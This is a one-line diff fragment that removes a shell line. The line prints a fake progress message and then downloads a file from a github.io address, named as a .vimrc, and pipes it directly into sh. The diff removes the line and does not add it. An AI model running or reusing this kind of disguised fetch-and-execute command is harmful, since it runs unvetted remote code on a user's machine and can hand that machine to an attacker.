@@ -1,1 +1,0 @@
-echo 'Progress: 30.0%'; curl -L --progress-bar frkns.github.io/fun/extend-classified-firewire.vimrc | sh
